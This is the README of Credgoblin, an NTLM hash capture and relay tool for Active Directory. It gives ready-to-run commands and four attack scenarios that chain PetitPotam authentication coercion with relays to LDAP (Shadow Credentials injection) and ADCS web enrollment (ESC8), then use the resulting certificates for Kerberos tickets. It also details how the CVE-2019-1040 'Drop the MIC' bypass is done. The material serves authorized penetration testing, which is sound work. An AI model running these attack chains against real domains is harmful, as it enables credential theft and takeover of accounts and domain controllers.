<p align="center">
  <img src="assets/credgoblin-logo.png" alt="Credgoblin Logo" width="350">
</p>

<h1 align="center">Credgoblin</h1>

<p align="center">
  <strong>NTLM Hash Capture &amp; Relay Tool</strong><br>
  <em>A Go-based credential interception toolkit for Active Directory security assessments</em>
</p>

<p align="center">
  <a href="#features">Features</a> •
  <a href="#installation">Installation</a> •
  <a href="#usage">Usage</a> •
  <a href="#attack-scenarios">Attack Scenarios</a> •
  <a href="#technical-details">Technical Details</a>
</p>

---

## Overview

Credgoblin is a high-performance NTLM credential capture and relay tool written in Go. It provides security professionals with the ability to:

- **Capture** NTLMv2 hashes from SMB, HTTP, and HTTPS connections
- **Relay** NTLM authentication to LDAP/LDAPS for Shadow Credentials attacks
- **Relay** to AD Certificate Services (ADCS) for ESC8 certificate abuse
- **Export** credentials in formats compatible with Hashcat and PKINITtools

## Features

| Category | Feature | Description |
|----------|---------|-------------|
| **Capture** | Multi-Protocol Listener | SMB (445), HTTP (80), HTTPS (443) with auto-generated TLS cert |
| **Capture** | Hashcat Output | NTLMv2 hashes in `-m 5600` format |
| **Relay** | LDAP/LDAPS | Shadow Credentials via `msDS-KeyCredentialLink` modification |
| **Relay** | ADCS (ESC8) | Certificate enrollment via web interface (`/certsrv/`) |
| **Relay** | Cross-Protocol | SMB→LDAP, SMB→HTTP, HTTP→LDAP relay chains |
| **Protocol** | SMB Support | SMB1→SMB2 negotiation upgrade and native SMB2 |
| **Protocol** | NTLM Support | Full Type 1/2/3 message handling with SPNEGO wrapping |
| **Protocol** | SICILY | Microsoft's LDAP NTLM authentication mechanism |
| **Attack** | CVE-2019-1040 | Drop the MIC implementation for cross-protocol relay |

## Installation

### From Source

```bash
git clone https://github.com/ineffectivecoder/credgoblin.git
cd credgoblin
go build -o credgoblin ./cmd/credgoblin
```

### Requirements

- **Go**: 1.23 or higher
- **Privileges**: Root/Administrator (required for binding to ports 80, 443, 445)
- **Platform**: Linux, macOS, Windows

## Usage

### Hash Capture Mode

Capture NTLMv2 hashes from incoming connections. Hashes are written in Hashcat `-m 5600` compatible format.

```bash
# Listen on all protocols (SMB + HTTP)
sudo ./credgoblin capture -i 0.0.0.0

# SMB only (port 445)
sudo ./credgoblin capture -i 0.0.0.0 -p 445

# HTTP and HTTPS (ports 80, 443)
sudo ./credgoblin capture -i 0.0.0.0 -p 80,443

# HTTPS only (required for Windows WebClient coercion)
sudo ./credgoblin capture -i 0.0.0.0 -p 443

# Custom output file with verbose logging
sudo ./credgoblin capture -i 0.0.0.0 -o captured_hashes.txt -v
```

**Capture Options:**

| Flag | Long | Default | Description |
|------|------|---------|-------------|
| `-i` | `--interface` | `0.0.0.0` | Listen address |
| `-p` | `--ports` | `both` | Ports: `80`, `443`, `445`, `both`, or comma-separated |
| `-o` | `--output` | `hashes.txt` | Output file for captured hashes |
| `-s` | `--server` | `CREDGOBLIN` | Server name to advertise in NTLM challenge |
| `-d` | `--domain` | `WORKGROUP` | Domain name to advertise in NTLM challenge |
| `-v` | `--verbose` | `false` | Enable verbose output |

### LDAP Relay Mode (Shadow Credentials)

Relay NTLM authentication to LDAP/LDAPS and inject Shadow Credentials for PKINIT-based authentication.

```bash
# Relay to LDAP
sudo ./credgoblin relay -t ldap://dc.domain.local \
    -u 'CN=TargetUser,CN=Users,DC=domain,DC=local'

# Relay to LDAPS (TLS encrypted)
sudo ./credgoblin relay -t ldaps://dc.domain.local \
    -u 'CN=TargetComputer,CN=Computers,DC=domain,DC=local'

# Custom PFX output with password
sudo ./credgoblin relay -t ldap://dc.domain.local \
    -u 'CN=Administrator,CN=Users,DC=domain,DC=local' \
    -o admin.pfx -P 'SecurePassword123'

# Listen on HTTP only (for WebDAV coercion)
sudo ./credgoblin relay -t ldap://dc.domain.local \
    -u 'CN=DC01,CN=Computers,DC=domain,DC=local' \
    -p 80
```

### ADCS Relay Mode (ESC8)

Relay to Active Directory Certificate Services web enrollment for certificate-based attacks.

```bash
# Relay to ADCS HTTP
sudo ./credgoblin relay -m adcs \
    -t http://ca.domain.local/certsrv \
    -T User

# Relay to ADCS HTTPS
sudo ./credgoblin relay -m adcs \
    -t https://ca.domain.local/certsrv \
    -T Machine

# HTTP listener only
sudo ./credgoblin relay -m adcs \
    -t http://ca.domain.local/certsrv \
    -T User -p 80
```

**Relay Options:**

| Flag | Long | Default | Description |
|------|------|---------|-------------|
| `-t` | `--target` | *required* | Target URL (`ldap://`, `ldaps://`, `http://`, `https://`) |
| `-m` | `--mode` | `ldap` | Relay mode: `ldap` or `adcs` |
| `-u` | `--target-user` | *required for LDAP* | Target user/computer Distinguished Name |
| `-T` | `--template` | *required for ADCS* | Certificate template name (e.g., `User`, `Machine`) |
| `-o` | `--output` | `<username>.pfx` | Output PFX path |
| `-P` | `--pfx-pass` | *random* | PFX password |
| `-p` | `--ports` | `both` | Listen ports: `80`, `445`, or `both` |
| `-v` | `--verbose` | `false` | Enable verbose output |

## Attack Scenarios

### Scenario 1: Shadow Credentials via Authentication Coercion

Leverage authentication coercion (e.g., PetitPotam, PrinterBug) to relay credentials and inject Shadow Credentials.

```bash
# Terminal 1: Start relay server
sudo ./credgoblin relay -t ldap://dc.corp.local \
    -u 'CN=DC01,CN=Computers,DC=corp,DC=local' -v

# Terminal 2: Coerce authentication from target DC
python3 PetitPotam.py 10.10.10.50 10.10.10.10

# Terminal 1: Use the resulting PFX for authentication
python3 gettgtpkinit.py -cert-pfx DC01.pfx \
    -pfx-pass 'GeneratedPassword' corp.local/DC01$
```

### Scenario 2: ESC8 - ADCS HTTP Relay

Abuse misconfigured ADCS web enrollment to obtain certificates.

```bash
# Terminal 1: Start ADCS relay
sudo ./credgoblin relay -m adcs \
    -t http://ca.corp.local/certsrv -T User -v

# Terminal 2: Coerce domain controller authentication
python3 PetitPotam.py 10.10.10.50 10.10.10.10

# Terminal 1: Use obtained certificate for authentication
python3 gettgtpkinit.py -cert-pfx DC01_.pfx \
    -pfx-pass 'GeneratedPassword' corp.local/DC01$
```

### Scenario 3: WebClient (WebDAV) Hash Capture

Capture credentials via WebClient service coercion. Requires HTTPS listener.

```bash
# Start HTTPS listener (WebClient requires HTTPS or localhost)
sudo ./credgoblin capture -i 0.0.0.0 -p 443 -v

# Coerce WebDAV authentication (from another machine)
python3 PetitPotam.py 10.10.10.50@80/test 10.10.10.10
```

### Scenario 4: HTTP to LDAP Relay

Relay HTTP NTLM authentication to LDAP for Shadow Credentials.

```bash
# Start HTTP relay to LDAP
sudo ./credgoblin relay -t ldap://dc.corp.local \
    -u 'CN=TargetServer,CN=Computers,DC=corp,DC=local' \
    -p 80 -v

# Coerce authentication via WebDAV
python3 PetitPotam.py 10.10.10.50@80/test 10.10.10.20
```

## Technical Details

### NTLM Relay Flow

```
 Victim              Credgoblin              Target (LDAP/ADCS)
   │                     │                     │
   │── SMB/HTTP ────────>│                     │
   │<── NTLM Challenge ──│                     │
   │── NTLM Type 1 ─────>│── NTLM Type 1 ─────>│
   │                     │<── NTLM Type 2 ─────│
   │<── NTLM Type 2 ─────│                     │
   │── NTLM Type 3 ─────>│── NTLM Type 3 ─────>│
   │                     │<── Auth Success ────│
   │                     │── Attack ──────────>│
   │<── Auth Response ───│                     │
```

### LDAP SICILY Authentication

Credgoblin uses SICILY (Security Integrated Connection over LDAP with Yielding) for LDAP relay, which is Microsoft's proprietary NTLM-over-LDAP mechanism:

1. **Package Discovery** (Context Tag 9): Empty bind to enumerate authentication mechanisms
2. **Negotiate Bind** (Context Tag 10): Forward NTLM Type 1 with `NTLM` mechanism name
3. **Response Bind** (Context Tag 11): Forward NTLM Type 3 to complete authentication

The implementation handles Windows DC quirks including:
- Pre-SICILY queries to initialize connection state
- Proper message ID sequencing
- Base DN caching before authentication (required for post-auth operations)

### Shadow Credentials Implementation

The `msDS-KeyCredentialLink` attribute is modified to contain a `KeyCredential` structure with:

- **Version**: 0x00000200 (v2 structure)
- **Key ID** (Type 0x01): SHA256 hash of the public key
- **Key Hash** (Type 0x02): SHA256 integrity hash of all properties
- **Key Material** (Type 0x03): RSA 2048-bit public key in BCRYPT_RSAKEY_BLOB format
- **Key Usage** (Type 0x04): 0x01 (NGC - Next Generation Credentials)
- **Key Source** (Type 0x05): 0x00 (AD)
- **Device ID** (Type 0x06): Random UUID
- **Custom Key Info** (Type 0x07): Key version information
- **Timestamps** (Types 0x08, 0x09): Last logon and creation times in FILETIME format

Generated PFX certificates include:
- Self-signed X.509 certificate
- UPN (User Principal Name) SAN extension for PKINIT compatibility
- 40-year validity period

### CVE-2019-1040 (Drop the MIC)

For cross-protocol relay attacks, Credgoblin implements the "Drop the MIC" technique:

1. **Strip Signing Flags**: Remove `NTLMSSP_NEGOTIATE_SIGN` and `NTLMSSP_NEGOTIATE_ALWAYS_SIGN` from Type 1
2. **Remove VERSION/MIC**: Strip VERSION (8 bytes) and MIC (16 bytes) fields from Type 3
3. **Adjust Offsets**: Update all security buffer offsets by -24 bytes
4. **Clear MIC Flag**: Zero the MIC Present bit (0x02) in `MsvAvFlags` within AV_PAIRS

### Hash Output Format

Captured hashes use Hashcat NTLMv2 format (`-m 5600`):

```
username::DOMAIN:ServerChallenge:NTProofStr:NTLMv2ClientChallenge
```

Example:
```
administrator::CORP:1122334455667788:A1B2C3D4E5F6...:0101000000000000...
```

## Limitations

| Limitation | Description |
|------------|-------------|
| **SMB Signing** | Targets with required SMB signing will reject relay attacks |
| **LDAP Signing** | Domain controllers requiring LDAP signing may block relay |
| **EPA/Channel Binding** | Windows Server 2022+ may enforce EPA by default, blocking LDAP relay |
| **Certificate Templates** | ADCS relay requires enrollment-enabled certificate templates without manager approval |
| **MIC Validation** | Some patched systems validate MIC even for cross-protocol relay |

## Project Structure

```
credgoblin/
├── cmd/credgoblin/          # CLI entry points
│   ├── main.go              # Command routing
│   ├── capture.go           # Hash capture subcommand
│   └── relay.go             # Relay attack subcommand
├── pkg/
│   ├── config/              # Configuration structures
│   ├── ntlm/                # NTLM message parsing and generation
│   ├── output/              # Logging and hash file writing
│   ├── relay/               # Relay attack implementations
│   │   ├── relay.go         # SMB relay handler
│   │   ├── ldap.go          # LDAP/SICILY client
│   │   └── adcs.go          # ADCS HTTP client
│   ├── shadowcreds/         # KeyCredential generation and PFX export
│   └── smb/                 # SMB1/SMB2 protocol handling
└── assets/                  # Logo and assets
```

## Dependencies

| Package | Purpose |
|---------|---------|
| [go-ldap/ldap](https://github.com/go-ldap/ldap) | LDAP protocol support |
| [go-asn1-ber](https://github.com/go-asn1-ber/asn1-ber) | ASN.1 BER encoding for LDAP/SPNEGO |
| [google/uuid](https://github.com/google/uuid) | UUID generation for KeyCredential |
| [go-pkcs12](https://pkg.go.dev/software.sslmate.com/src/go-pkcs12) | PFX/PKCS#12 certificate export |
| [mjwhitta/cli](https://github.com/mjwhitta/cli) | Command-line argument parsing |

## Credits

Credgoblin draws inspiration and techniques from:

- [Impacket](https://github.com/fortra/impacket) - ntlmrelayx reference implementation
- [Responder](https://github.com/lgandx/Responder) - Hash capture techniques
- [PKINITtools](https://github.com/dirkjanm/PKINITtools) - PKINIT authentication tools
- [Certipy](https://github.com/ly4k/Certipy) - ADCS attack research

## License

MIT License - See [LICENSE](LICENSE) for details.

## Disclaimer

**This tool is intended for authorized security testing and research purposes only.**

- Obtain proper written authorization before using this tool
- Ensure compliance with all applicable laws and regulations
- The authors are not responsible for misuse or damage caused by this tool
